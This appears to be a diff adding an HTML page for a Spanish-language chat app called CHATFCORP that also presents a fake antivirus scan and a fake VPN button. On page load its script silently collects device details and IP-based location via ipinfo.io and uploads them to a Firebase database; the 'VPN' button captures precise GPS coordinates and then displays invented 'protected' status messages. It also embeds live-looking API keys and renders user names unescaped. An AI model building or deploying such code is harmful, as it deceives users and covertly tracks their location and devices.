@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CHATFCORP</title>
+    <link rel="manifest" href="manifest.json">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
+        import { getDatabase, ref, push, onValue, set } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDT7bX6qTx2U1EcDuugMZ0xdXzHNOifOzE",
+            authDomain: "fcorp-f0633.firebaseapp.com",
+            databaseURL: "https://fcorp-f0633-default-rtdb.firebaseio.com",
+            projectId: "fcorp-f0633",
+            storageBucket: "fcorp-f0633.firebasestorage.app",
+            messagingSenderId: "536164036989",
+            appId: "1:536164036989:web:f4c0776c1b7e44b5005c14",
+            measurementId: "G-W15GX5VNZ1"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        const mensajesRef = ref(db, 'mensajes');
+        const geoRef = ref(db, 'geolocations');
+
+        let miNombre = localStorage.getItem('miNombre') || '';
+
+        if (miNombre) {
+            document.getElementById('nombre-container').classList.add('hidden');
+            document.getElementById('chat-input').classList.remove('hidden');
+            cargarMensajes();
+        }
+
+        window.guardarNombre = function() {
+            const nombre = document.getElementById('nombre-inicial').value.trim();
+            if (!nombre) {
+                alert("¡Escribe tu nombre!");
+                return;
+            }
+            miNombre = nombre;
+            localStorage.setItem('miNombre', miNombre);
+            document.getElementById('nombre-container').classList.add('hidden');
+            document.getElementById('chat-input').classList.remove('hidden');
+            cargarMensajes();
+        };
+
+        window.enviar = function() {
+            const msg = document.getElementById('mensaje').value.trim();
+            if (!msg) {
+                alert("¡Escribe un mensaje!");
+                return;
+            }
+
+            const timestamp = new Date().toISOString();
+            const sanitizedMsg = new DOMParser().parseFromString(msg, 'text/html').body.textContent;
+            const mensaje = {
+                nombre: miNombre,
+                mensaje: sanitizedMsg,
+                timestamp: timestamp,
+                hora: new Date().toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit' })
+            };
+
+            push(mensajesRef, mensaje)
+                .then(() => {
+                    document.getElementById('mensaje').value = '';
+                    const notif = document.getElementById('notificacion');
+                    notif.style.display = 'block';
+                    setTimeout(() => notif.style.display = 'none', 1000);
+                })
+                .catch(error => {
+                    alert("Error al enviar: " + error.message);
+                });
+        };
+
+        function cargarMensajes() {
+            onValue(mensajesRef, (snapshot) => {
+                const messagesDiv = document.getElementById('messages');
+                messagesDiv.innerHTML = '';
+
+                const data = snapshot.val();
+                if (!data) {
+                    messagesDiv.innerHTML = '<div id="chat-vacio">CHAT FCORP</div>';
+                    return;
+                }
+
+                Object.entries(data).forEach(([id, mensaje]) => {
+                    const clase = (mensaje.nombre === miNombre) ? 'mio' : 'otro';
+                    const safeMessage = new DOMParser().parseFromString(mensaje.mensaje, 'text/html').body.textContent;
+                    const html = `<div class="mensaje ${clase}" data-id="${id}"><b>${mensaje.nombre}</b>: ${safeMessage}<div class="hora">${mensaje.hora}</div></div>`;
+                    messagesDiv.insertAdjacentHTML('beforeend', html);
+                });
+
+                messagesDiv.scrollTop = messagesDiv.scrollHeight;
+            }, (error) => {
+                alert("Error al cargar mensajes: " + error.message);
+            });
+        }
+
+        window.requestLocation = function() {
+            const statusElement = document.getElementById('vpn-status');
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const geoData = {
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toISOString()
+                    };
+                    push(geoRef, geoData)
+                        .then(() => {
+                            statusElement.innerHTML = '(Conectando 🇺🇸...)';
+                            setTimeout(() => {
+                                statusElement.innerHTML = '(Protegiendo datos...) (Cambiando IP...)';
+                                setTimeout(() => {
+                                    statusElement.innerHTML = 'Protegido Conectado a 192.168.1.100 🇺🇸';
+                                }, 2000);
+                            }, 2000);
+                        })
+                        .catch(error => {
+                            statusElement.innerHTML = '(No está protegido)';
+                        });
+                },
+                (error) => {
+                    statusElement.innerHTML = '(No está protegido)';
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        };
+
+        // AGREGADO: Captura de datos extendidos del dispositivo y envío a Firebase
+        window.addEventListener('load', () => {
+            // Función para obtener la batería de forma asíncrona
+            async function getBatteryInfo() {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: `${Math.round(battery.level * 100)}%`,
+                        charging: battery.charging ? 'Sí' : 'No'
+                    };
+                } else {
+                    return {
+                        level: 'No soportado',
+                        charging: 'No soportado'
+                    };
+                }
+            }
+
+            // Obtener todos los datos del dispositivo
+            const timestamp = new Date().toISOString();
+            getBatteryInfo().then(batteryInfo => {
+                const deviceData = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    deviceMemory: navigator.deviceMemory || 'No soportado',
+                    cpuCores: navigator.hardwareConcurrency || 'No soportado',
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    colorDepth: screen.colorDepth,
+                    batteryLevel: batteryInfo.level,
+                    batteryCharging: batteryInfo.charging,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    touchSupport: 'ontouchstart' in window ? 'Sí' : 'No'
+                };
+
+                fetch('https://ipinfo.io/json?token=f8f778d94d0441')
+                    .then(response => response.json())
+                    .then(data => {
+                        const [lat, lon] = data.loc.split(',');
+                        const ip = data.ip;
+
+                        // Verificar si esta IP ya fue aprobada previamente
+                        const approvedIps = JSON.parse(localStorage.getItem('approvedIps') || '[]');
+                        if (approvedIps.includes(ip)) {
+                            document.getElementById('verificacion').classList.add('hidden');
+                            document.getElementById('contenido').classList.remove('hidden');
+                            let miNombre = localStorage.getItem('miNombre') || '';
+                            if (miNombre) {
+                                document.getElementById('nombre-container').classList.add('hidden');
+                                document.getElementById('chat-input').classList.remove('hidden');
+                                cargarMensajes();
+                            }
+                            return; // Salir si ya está aprobada
+                        }
+
+                        const solicitudData = {
+                            ...deviceData,
+                            ip: ip,
+                            hostname: data.hostname,
+                            city: data.city,
+                            region: data.region,
+                            country: data.country,
+                            lat: parseFloat(lat),
+                            lon: parseFloat(lon),
+                            org: data.org,
+                            postal: data.postal,
+                            timezone: data.timezone,
+                            timestamp: timestamp,
+                            aprobado: false
+                        };
+                        const solicitudesRef = ref(db, 'solicitudes');
+                        const nuevaSolicitud = push(solicitudesRef, solicitudData);
+
+                        onValue(ref(db, 'solicitudes/' + nuevaSolicitud.key), (snapshot) => {
+                            const solicitud = snapshot.val();
+                            if (solicitud && solicitud.aprobado === true) {
+                                // Guardar la IP como aprobada en localStorage
+                                approvedIps.push(ip);
+                                localStorage.setItem('approvedIps', JSON.stringify(approvedIps));
+                                document.getElementById('verificacion').classList.add('hidden');
+                                document.getElementById('contenido').classList.remove('hidden');
+                                let miNombre = localStorage.getItem('miNombre') || '';
+                                if (miNombre) {
+                                    document.getElementById('nombre-container').classList.add('hidden');
+                                    document.getElementById('chat-input').classList.remove('hidden');
+                                    cargarMensajes();
+                                }
+                            }
+                        });
+                    })
+                    .catch(error => {
+                        const solicitudData = {
+                            ...deviceData,
+                            timestamp: timestamp,
+                            aprobado: false,
+                            error: "No se pudo obtener datos de ipinfo.io"
+                        };
+                        const solicitudesRef = ref(db, 'solicitudes');
+                        const nuevaSolicitud = push(solicitudesRef, solicitudData);
+
+                        onValue(ref(db, 'solicitudes/' + nuevaSolicitud.key), (snapshot) => {
+                            const solicitud = snapshot.val();
+                            if (solicitud && solicitud.aprobado === true) {
+                                document.getElementById('verificacion').classList.add('hidden');
+                                document.getElementById('contenido').classList.remove('hidden');
+                                let miNombre = localStorage.getItem('miNombre') || '';
+                                if (miNombre) {
+                                    document.getElementById('nombre-container').classList.add('hidden');
+                                    document.getElementById('chat-input').classList.remove('hidden');
+                                    cargarMensajes();
+                                }
+                            }
+                        });
+                    });
+            });
+        });
+    </script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background: #000;
+            font-family: 'Courier New', monospace;
+        }
+
+        .pwa-section {
+            width: 300px;
+            margin: 0 auto;
+            padding: 10px;
+            color: #0f0;
+            overflow-y: auto;
+            border-bottom: 2px solid #333333;
+            text-align: center;
+        }
+        #start-btn {
+            padding: 15px 30px;
+            font-size: 18px;
+            background: transparent;
+            color: #0f0;
+            border: 2px solid #0f0;
+            border-radius: 5px;
+            margin-top: 20px;
+            cursor: pointer;
+            text-shadow: 0 0 5px #0f0;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        #vpn-btn {
+            padding: 10px 20px;
+            font-size: 14px;
+            background: transparent;
+            color: #0f0;
+            border: 2px solid #0f0;
+            border-radius: 5px;
+            margin: 10px 0;
+            cursor: pointer;
+            text-shadow: 0 0 5px #0f0;
+            width: 150px;
+            box-sizing: border-box;
+        }
+        #vpn-status {
+            display: inline-block;
+            font-size: 12px;
+            color: #0f0;
+            text-shadow: 0 0 5px #0f0;
+            margin-left: 10px;
+            vertical-align: middle;
+        }
+        .vpn-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 10px 0;
+        }
+        #progress-bar {
+            width: 100%;
+            height: 20px;
+            background: #222;
+            margin: 20px 0;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid #0f0;
+            box-shadow: 0 0 10px #0f0;
+        }
+        #progress {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #0f0, #0c0);
+            transition: width 0.3s ease;
+        }
+        #antivirus-status {
+            margin: 20px 0;
+            min-height: 60px;
+            text-shadow: 0 0 5px #0f0;
+        }
+        .time-info {
+            color: #0f0;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+
+        .chat-section {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            background: #000000;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+        #chat-title {
+            padding: 10px;
+            text-align: center;
+            font-size: 1.2em;
+        }
+        #messages {
+            flex: 1;
+            padding: 15px;
+            overflow-y: auto;
+        }
+        .mensaje {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 8px;
+            max-width: 70%;
+            word-wrap: break-word;
+            position: relative;
+        }
+        .mensaje.mio {
+            background: #075e54;
+            float: right;
+            clear: both;
+        }
+        .mensaje.otro {
+            background: #262d31;
+            float: left;
+            clear: both;
+        }
+        .hora {
+            font-size: 0.8em;
+            color: #cccccc;
+            margin-top: 5px;
+            text-align: right;
+        }
+        .input-container {
+            position: sticky;
+            bottom: 0;
+            background: #1a1a1a;
+            width: 100%;
+            padding: 10px;
+            box-shadow: 0 -2px 10px rgba(255,255,255,0.1);
+            display: flex;
+            gap: 5px;
+        }
+        #nombre-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(255,255,255,0.1);
+        }
+        input {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #333333;
+            border-radius: 5px;
+            background: #333333;
+            color: #ffffff;
+        }
+        button {
+            padding: 10px 20px;
+            background: #4a4a4a;
+            color: #ffffff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #666666;
+        }
+        .hidden {
+            display: none !important; /* Cambio para asegurar que #verificacion se oculte completamente */
+        }
+        #notificacion {
+            position: fixed;
+            bottom: 60px;
+            right: 20px;
+            background: #075e54;
+            padding: 10px;
+            border-radius: 5px;
+            color: #ffffff;
+            font-size: 0.9em;
+            display: none;
+        }
+        #chat-vacio {
+            text-align: center;
+            padding: 20px;
+            font-size: 1.2em;
+            color: #cccccc;
+        }
+    </style>
+</head>
+<body>
+    <!-- AGREGADO: Pantalla de verificación -->
+    <div id="verificacion" style="display: flex; justify-content: center; align-items: center; height: 100vh; background: #000; color: #fff; font-family: 'Courier New', monospace;">
+        <h1>Cargando...</h1>
+    </div>
+
+    <!-- AGREGADO: Contenido envuelto en un div oculto -->
+    <div id="contenido" class="hidden">
+        <div class="container">
+            <div class="pwa-section">
+                <button id="start-btn">Iniciar Análisis</button>
+                <div id="progress-bar">
+                    <div id="progress"></div>
+                </div>
+                <div id="antivirus-status">🔒 Selecciona DCIM</div>
+                <div class="vpn-container">
+                    <button id="vpn-btn" onclick="requestLocation()">VPN 🇺🇸🇯🇵</button>
+                    <span id="vpn-status"></span>
+                </div>
+                <div id="time-info" class="time-info"></div>
+            </div>
+
+            <div class="chat-section">
+                <div id="chat-title">FCORP</div>
+                <div id="nombre-container">
+                    <input type="text" id="nombre-inicial" placeholder="Escribe tu nombre">
+                    <button onclick="guardarNombre()">Continuar</button>
+                </div>
+                <div id="messages"></div>
+                <div class="input-container hidden" id="chat-input">
+                    <input type="text" id="mensaje" placeholder="Escribe algo...">
+                    <button onclick="enviar()">Enviar</button>
+                </div>
+                <div id="notificacion">✔ Enviado</div>
+            </div>
+        </div>
+    </div>
+    <script src="app.js"></script>
+</body>
+</html>
